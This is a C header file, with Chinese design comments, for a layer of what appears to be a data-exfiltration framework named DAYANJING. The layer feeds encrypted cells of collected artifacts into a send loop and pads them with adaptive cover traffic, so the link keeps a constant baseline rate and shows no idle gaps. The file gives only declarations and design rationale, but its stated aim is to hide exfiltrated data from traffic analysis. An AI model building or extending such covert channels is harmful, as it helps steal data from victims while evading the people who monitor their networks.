/*
 * DAYANJING v4 — exfil_link_cover.h
 *
 * 自适应覆盖流量接入**真实数据面发送循环**。
 *
 * ====================================================================
 * 被解除的限制
 * ====================================================================
 * 此前 14_p2p 的 cover.c 能算出"此刻应以多快的速率发覆盖信元"，
 * mix_cover.c 能把速率折算成"本片应发几个覆盖信元"，但**没有任何代码
 * 在真实的产物发送路径上调用它们** —— 覆盖流量是"算出来了但没人发"。
 *
 * 本层补上这一段：把 exfil 的产物发送从"编码后一次 write 全部写出"
 * 改为"入队 -> 按片出队 -> 数据优先、覆盖按预算补"。于是：
 *   - 有数据时：数据信元按片输出，覆盖按剩余预算补足，总速率趋于恒定
 *   - 空闲时：只有覆盖信元，维持基线流量，不出现"静默期"
 *   - 换信道：bytes_per_cell 变化，覆盖自动缩放，低速信道不被打满
 *
 * ====================================================================
 * 为什么不在 exfil_link_send 上就地改
 * ====================================================================
 * exfil_link_send 的语义是"一条产物 -> 全部字节写出"，它是同步的、
 * 一次性的，被既有测试（79+37+72+12+104+82+51 项）依赖。把速率治理
 * 塞进去会让这些测试全部变成"慢速分片"，且背压语义会破坏它们的
 * "一次发完即可读回"假设。故新增本层，原路径保持不变。
 *
 * ====================================================================
 * 三条硬规则（与 mix_cover.c 一致，本层必须遵守）
 * ====================================================================
 * 1) 覆盖信元必须用**与数据相同的 cell 上下文**封装。
 *    本层直接传 &ch->cell —— 信元层 IV = pfx || counter，counter 由
 *    接收方现算。用独立上下文另造覆盖信元会让接收方计数器错位，
 *    表现为全线 AUTH，而真实原因是"覆盖开了一条旁路"。
 *
 * 2) 数据先封装、覆盖后封装；先数据、后覆盖输出。
 *    数据信元在 enqueue 前已由 exfil_chan_send 封装（counter 已定），
 *    覆盖信元在出片时才封装。把后封装的覆盖插到先封装的数据之前，
 *    接收方会看到 counter 回退 -> REPLAY -> 全线解不开。
 *
 * 3) note_data 必须在**发送之后**记账。
 *    在判决前记账等于用预测值压低覆盖，数据突发时会出现"数据已发但
 *    覆盖没降"，总速率冲出预算。该记账由 p2p_mix_flush_adaptive 内部
 *    完成（它在排完数据后才调用 p2p_cover_note_data），本层不重复记。
 *
 * ====================================================================
 * 时间注入
 * ====================================================================
 * now_ms 由调用方注入，本层不读系统时钟。send_adaptive 内部按
 * period_ms 推进虚拟时间以驱动连续出片 —— 这样测试不需要 sleep，
 * 且"片数/覆盖数"可精确断言。
 */

#ifndef DAYANJING_EXFIL_LINK_COVER_H
#define DAYANJING_EXFIL_LINK_COVER_H

#include <stddef.h>
#include <stdint.h>
#include "exfil.h"
#include "p2p_mix.h"
#include "p2p_cover.h"

#ifdef __cplusplus
extern "C" {
#endif

/* 一次 send_adaptive 允许的最大出片次数（防死循环） */
#define EXF_LINKCOVER_MAX_TICKS  4096u

/* 单批允许入队的信元数上限（约 16 MiB；防恶意/误用撑爆内存） */
#define EXF_LINKCOVER_MAX_CELLS  (1u << 15)

/* 返回码 */
#define EXF_LC_OK        0
#define EXF_LC_ERR_ARG  -1   /* 参数非法 / 未 init */
#define EXF_LC_ERR_FULL -2   /* mix 队列满 —— 背压信号，调用方应降速而非丢弃 */
#define EXF_LC_ERR_IO   -3   /* 写出失败（短写失败 / 对端关闭） */
#define EXF_LC_ERR_TICK -4   /* 出片次数超上限仍有残留（防御性，不应发生） */
#define EXF_LC_ERR_NOMEM -5  /* 编码缓冲分配失败 */

typedef struct {
    p2p_mix_t   mx;          /* 混序/排队：数据信元在此排队等待出片 */
    p2p_cover_t cov;         /* 自适应覆盖速率 */
    uint32_t    period_ms;   /* 片长 */
    uint32_t    batch;       /* 每片数据信元上限（背压边界） */

    /*
     * 当前批次：编码后的信元暂存于此，**分批**入队。
     * 必须有这层缓冲 —— mix 队列容量 P2P_MIX_MAXQ=64，而一条 100KB 产物
     * 可编码出 204 个信元；要求"一次入队整批"会在第 64 个溢出，导致
     * 一批发不出去、接收端永远等不到 FIN（实测死锁）。
     */
    uint8_t    *enc;         /* 编码缓冲（堆） */
    size_t      enc_bytes;   /* 缓冲字节数 */
    size_t      enc_n;       /* 本批总信元数 */
    size_t      enc_i;       /* 已入队到第几个 */
    uint32_t    stream;      /* 本批所属流 */

    uint64_t    bytes_sent;  /* 累计线上字节（诊断/预算核对） */
    uint64_t    cells_sent;  /* 累计信元数 */
    uint64_t    cover_sent;  /* 其中覆盖信元数 */
    int         inited;
} exfil_link_cover_t;

/*
 * 初始化。
 *   budget_bpm 为 0 表示禁用覆盖（退化为纯数据发送，仅受 batch 背压）。
 *   period_ms 为 0 取默认 50ms；batch 为 0 取默认 32。
 */
int exfil_link_cover_init(exfil_link_cover_t *lc, uint32_t seed,
                          uint32_t period_ms, uint32_t batch,
                          uint32_t profile, uint32_t budget_bpm,
                          uint32_t now_ms);

/* 切换信道画像（重算 bytes_per_cell） */
int exfil_link_cover_set_profile(exfil_link_cover_t *lc, uint32_t profile);

/* 用实测成本覆盖画像默认值 */
int exfil_link_cover_set_cost(exfil_link_cover_t *lc, uint32_t bytes_per_cell);

/* 设置字节预算（信元/分钟的推导基准）；0 = 禁用覆盖 */
int exfil_link_cover_set_budget(exfil_link_cover_t *lc, uint32_t budget_bpm);

/* 设置覆盖速率上下限 */
int exfil_link_cover_set_bounds(exfil_link_cover_t *lc, uint32_t min_per_min,
                                uint32_t max_per_min);

/*
 * 提交一条产物：编码成信元流存于本层缓冲，**不入队**。
 *
 * 为什么不直接入队：mix 队列容量 64，而大产物可达 204 个信元，一次
 * 入队必然溢出。正确做法是 submit 后反复 pump（入队-出片交替），
 * 队列容量只影响吞吐粒度，不影响一批能否发完。
 *
 * 同一时刻只持有一批：重复提交会释放并覆盖未发完的批次，
 * 调用方应先 pump 到 pending()==0 再提交下一批。
 */
int exfil_link_cover_submit(exfil_chan_t *ch, exfil_link_cover_t *lc,
                            const exfil_rec_t *r, uint32_t stream,
                            size_t *out_cells);

/*
 * 泵送一次：把缓冲里能装下的信元入队（受队列容量背压），然后出一片写出。
 * 这是"真实发送循环"的单步 —— 长期运行应周期性调用本函数。
 */
int exfil_link_cover_pump(exfil_chan_t *ch, exfil_link_cover_t *lc,
                          int fd, uint32_t now_ms,
                          size_t *out_real, size_t *out_cover);

/* 释放提交缓冲并清零（含密文） */
void exfil_link_cover_wipe(exfil_link_cover_t *lc);

/*
 * 空闲维持：队列为空时也出一次片，产出纯覆盖信元。
 * 定期调用即可让链路在没有任何采集产物时仍保持基线流量。
 */
int exfil_link_cover_idle(exfil_chan_t *ch, exfil_link_cover_t *lc,
                          int fd, uint32_t now_ms, size_t *out_cover);

/*
 * 一次性发送：入队 + 连续出片直到队列排空（内部推进虚拟时间）。
 * 供调用方"发完一条产物"使用；长期运行应改用 enqueue + 周期 flush/idle。
 */
int exfil_link_send_adaptive(exfil_chan_t *ch, exfil_link_cover_t *lc,
                             const exfil_rec_t *r, int fd, uint32_t now_ms,
                             uint32_t stream,
                             size_t *out_real, size_t *out_cover);

/* 观察：当前自适应覆盖速率（信元/分钟） */
uint32_t exfil_link_cover_rate(const exfil_link_cover_t *lc);

/* 观察：待发数据信元总数 = mix 队列中的 + 提交缓冲中未入队的 */
size_t exfil_link_cover_pending(const exfil_link_cover_t *lc);

/* 观察：本分钟线上预计总字节数 */
uint32_t exfil_link_cover_projected_bpm(const exfil_link_cover_t *lc);

const char *exfil_link_cover_errstr(int e);

#ifdef __cplusplus
}
#endif

#endif /* DAYANJING_EXFIL_LINK_COVER_H */
